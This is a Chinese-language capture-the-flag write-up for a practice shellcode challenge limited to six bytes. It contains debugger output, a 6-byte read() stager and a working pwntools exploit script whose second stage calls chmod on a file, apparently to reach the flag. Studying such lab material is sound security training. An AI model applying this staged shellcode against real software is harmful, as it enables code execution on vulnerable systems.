# 挑战简介
编写并执行 shellcode 来读取标志，但这次你只得到 6 个字节:)

# 思路
只能用6字节，其实你就要注重考虑利用寄存器现有状态来利用了

动调结果在read函数之前如下，发现
- rax为0，调用输入
- rdx指向其实内存运行地址

所以我们可以充分利用这两点
```
RAX  0x0
 RBX  0x5603eabf77e0 (__libc_csu_init) ◂— endbr64
 RCX  0x7fd6e999c1e7 (write+23) ◂— cmp    rax, -0x1000 /* 'H=' */
 RDX  0x2e15e000 ◂— xor    eax, eax /* 0x50f7fb2c031 */
 RDI  0x7fd6e9a794c0 (_IO_stdfile_1_lock) ◂— 0x0
 RSI  0x5603eae4a2a0 ◂— '\nxecuting shellcode!\nut to execute the following shellcode:\nnd arguments and close all file descriptors > 2.\nthan doing\n\n'
 R8   0x16
 R9   0x2f
 R10  0x5603eabf83f5 ◂— 0x6c6c656873000a21 /* '!\n' */
 R11  0x246
 R12  0x5603eabf71e0 (_start) ◂— endbr64
 R13  0x7fffc58f2320 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffc58f2230 ◂— 0x0
 RSP  0x7fffc58f21f0 —▸ 0x7fffc58f2216 ◂— 0x2710eabf71e00000
*RIP  0x5603eabf77ca (main+611) ◂— call   rdx
───────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────
   0x5603eabf77af <main+584>    lea    rdi, [rip + 0xce0]
   0x5603eabf77b6 <main+591>    call   puts@plt <puts@plt>

   0x5603eabf77bb <main+596>    mov    rax, qword ptr [rip + 0x285e] <0x5603eabfa020>
   0x5603eabf77c2 <main+603>    mov    rdx, rax
   0x5603eabf77c5 <main+606>    mov    eax, 0
 ► 0x5603eabf77ca <main+611>    call   rdx <0x2e15e000>

   0x5603eabf77cc <main+613>    mov    eax, 0
   0x5603eabf77d1 <main+618>    leave
   0x5603eabf77d2 <main+619>    ret

   0x5603eabf77d3               nop    word ptr cs:[rax + rax]
   0x5603eabf77dd               nop    dword ptr [rax]
───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffc58f21f0 —▸ 0x7fffc58f2216 ◂— 0x2710eabf71e00000
01:0008│     0x7fffc58f21f8 —▸ 0x7fffc58f2338 —▸ 0x7fffc58f2857 ◂— 0x0
02:0010│     0x7fffc58f2200 —▸ 0x7fffc58f2328 —▸ 0x7fffc58f283a ◂— 0x0
03:0018│     0x7fffc58f2208 ◂— 0x1eabf77e0
04:0020│     0x7fffc58f2210 ◂— 0x0
05:0028│     0x7fffc58f2218 ◂— 0x2710eabf71e0
06:0030│     0x7fffc58f2220 —▸ 0x7fffc58f2330 ◂— 0x0
07:0038│     0x7fffc58f2228 —▸ 0x7fffc58f23e8 ◂— 0x0
─────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────
 ► f 0   0x5603eabf77ca main+611
   f 1   0x7fd6e98b20b3 __libc_start_main+243
   f 2   0x5603eabf720e _start+46 
```

```
xor edi,edi   # 0, stdin
push rdx     # rdx=shellcode addr
pop rsi
syscall     # read, rax=0(default)
```
执行完这一段，相当于我们用一个新的read将原先有限制的read覆盖了，接下来就可以有其他操作了

```
#!/usr/bin/python
from pwn import *
import struct
import os
cache_dir = '/tmp/.pwntools-cache'
if not os.path.exists(cache_dir):
    os.makedirs(cache_dir)

context(os='linux', arch='amd64', log_level='debug', cache_dir=cache_dir)

p = process('/challenge/babyshell-level-14')

p.recvuntil('Reading 0x6 bytes from stdin.\n')

shellcode = asm('''
    xor edi,edi   # 0, stdin
    push rdx     # rdx=shellcode addr
    pop rsi
    syscall     # read, rax=0(default)
    .fill 0x6, 1, 0x90
    push 0x66
    mov rdi, rsp
    push 4
    pop rsi
    push 90
    pop rax
    syscall
''')


# 为安全起见，打印完整的shellcode十六进制表示
print("Shellcode十六进制:", shellcode.hex())
print("Shellcode长度:", len(shellcode), "字节")

p.send(shellcode)

# 与shell交互
p.interactive()
p.recvall()
```
